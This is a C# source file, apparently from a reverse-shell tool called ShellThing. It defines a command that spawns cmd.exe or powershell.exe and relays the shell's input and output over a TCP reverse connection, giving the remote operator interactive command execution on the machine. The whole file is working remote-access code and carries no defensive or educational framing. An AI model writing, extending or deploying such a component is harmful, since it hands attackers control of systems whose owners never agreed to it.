using System;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    class ShellSpawnCommand : ICommand
    {
        private string shellType;

        TcpReverseConnection connection;
     
        public ShellSpawnCommand(string shellType)
        {
            this.shellType = shellType;
        }

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;

            ShellSubProcess shell = new ShellSubProcess(shellType);
            SubProcessIoManager processIoManager = new SubProcessIoManager(shell.Process, connection);

            // Subscribe to events for stdout and stderr being read from target process
            processIoManager.StdoutTextRead += new StringReadEventHandler(OnStdOutRead);
            processIoManager.StderrTextRead += new StringReadEventHandler(OnStdErrRead);

            shell.StartProcess();
            processIoManager.StartProcessOutputRead();

            // continuously write from connection.ReceiveData() to stdin of target process
            while (shell.Process.HasExited == false)
            {
                processIoManager.WriteStdIn();
            }         
        }

        private void OnStdOutRead(string text)
        {
            connection.SendData(text);
        }

        private void OnStdErrRead(string text)
        {
            connection.SendData(text);
        }

        public Dictionary<string, string> Help(bool includeSyntax)
        {
            Dictionary<string, string> helpText = new Dictionary<string, string>();

            
            // Display description
            helpText.Add("cmd", "Drop into a system command shell (cmd.exe)");
            helpText.Add("powershell", "Drop into a system command shell (powershell.exe)");

            // Display syntax or do nothing if no additional syntax required
            return helpText;
        }
    }
}
